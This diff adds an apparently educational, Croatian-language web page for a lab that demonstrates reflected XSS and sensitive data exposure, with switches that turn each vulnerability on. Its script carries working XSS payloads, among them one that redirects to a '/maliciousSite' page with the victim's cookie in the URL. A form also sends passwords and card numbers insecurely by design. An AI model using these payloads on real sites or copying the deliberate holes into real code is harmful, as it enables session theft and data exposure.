@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sigurnost</title>
+</head>
+<body>
+    <h1>Cross-Site Scripting (XSS)</h1>
+
+    <h3>Reflektirani XSS: dio URL-a</h3>
+    <input type="checkbox" id="xss"> <label for="xss"> Ranjivost uključena </label>
+    <h4>Maliciozni linkovi:</h4>
+    <p>Okida skriptu alert:</p>
+    <button onclick="openAlert()"> Prikaži alert </button>
+    <p>Okida skriptu sa preusmjeravanjem na malicioznu stranicu s kolačićem u URL queryju:</p>
+    <button onclick="openCookie()"> Prikaži cookie </button>
+
+    <div style="border-bottom: 1px solid red; margin-top: 40px;"></div>
+
+    <h1>Sensitive Data Exposure</h1>
+
+    <form action="/userInsert" method="POST">
+        <input type="checkbox" id="secure" name="secure"> <label for="secure"> Ranjivost uključena </label> <br><br>
+        <label for="username"> Unesite korisnika </label> <input type="text" id="username" name="username"> 
+        <label for="username"> (ime i prezime) </label> <br><br>
+        <label for="password"> Unesite lozinku </label> <input type="text" id="password" name="password">
+        <label for="password">  </label> <br><br>
+        <label for="cardnumber"> Unesite broj kartice </label> <input type="text" id="cardnumber" name="cardnumber">
+        <label for="cardnumber"> (16 brojeva) </label> <br><br>
+        <button type="submit" class="btn btn-sm">Upiši u bazu</button> <br> 
+            <label style="color: red;" id="message"> <%= text %></label>
+    </form> <br><br>
+    <button onclick="openUserData()"> Prikaži podatke o korisnicima </button>
+</body>
+<script>
+    var date = new Date();
+    date.setTime(date.getTime() + (5*60*1000)); //5 minuta
+    let expires = "; expires=" + date.toUTCString();
+    document.cookie = 'token' + '='+ 'sensitive cookie token data' + ';Path=/; Expires=' + expires;
+    function openUserData(){
+        let checkbox = document.getElementById("secure")
+        if(checkbox.checked) {
+            document.location.href = "/userData?secure=0"
+        } else {
+            document.location.href = "/userData?secure=1"
+        }
+    }
+    function openAlert(){
+        let checkbox = document.getElementById("xss")
+        if(checkbox.checked) {
+            document.location.href= "/vulnerableSite?unchecked_value=<script>alert('XSS successful')</scr"+"ipt>"
+        } else {
+            document.location.href = "/vulnerableSite?escape=1&unchecked_value=<script>alert('XSS successful')</scr"+"ipt>"
+        }
+    }
+    function openCookie(){
+        let checkbox = document.getElementById("xss")
+        if(checkbox.checked) {
+            document.location.href = "/vulnerableSite?unchecked_value=<script>document.location.href='/maliciousSite?unimportant='%2Bdocument.cookie</scr"+"ipt>"
+        } else {
+            document.location.href = "/vulnerableSite?escape=1&unchecked_value=<script>document.location.href='/maliciousSite?unimportant='%2Bdocument.cookie</scr"+"ipt>"
+        }
+    }
+    function storeToDatabase(){
+        let username = document.getElementById("username").value
+        let password = document.getElementById("password").value
+        let cardnumber = document.getElementById("cardnumber").value
+        let checkbox = document.getElementById("sde")
+        if(checkbox.checked) {
+            document.location.href = "/userInsert?secure=0&username=" + username + "$password=" + password + " $cardnumber=" + cardnumber
+        } else {
+            document.location.href = "/userInsert?secure=1&username=" + username + "$password=" + password + " $cardnumber=" + cardnumber
+        }
+    }
+</script>
+</html>
